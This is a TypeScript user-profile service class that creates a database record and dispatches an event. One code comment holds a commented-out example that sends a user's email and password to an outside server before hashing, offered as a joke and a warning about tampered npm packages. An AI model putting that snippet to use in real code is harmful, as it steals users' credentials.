import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUserprofile, IUserprofileInputDTO } from '../interfaces/IUserprofile';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';

@Service()
export default class UserprofileService {
  constructor(
    @Inject('userprofileModel') private userprofileModel: Models.UserprofileModel,
    private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async Add(userprofileInputDTO: IUserprofileInputDTO): Promise<{ userprofile: IUserprofile}> {
    try {
     

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
     
      
      this.logger.silly('Creating userprofile db record');
      const userprofileRecord = await this.userprofileModel.create({
        ...userprofileInputDTO,
       
      });
      this.logger.silly('Generating JWT');
     

      if (!userprofileRecord) {
        throw new Error('Userprofile cannot be created');
      }

      this.eventDispatcher.dispatch(events.userprofile.add, { userprofile: userprofileRecord });

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const userprofile = userprofileRecord.toObject();
      
      return { userprofile };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }


}
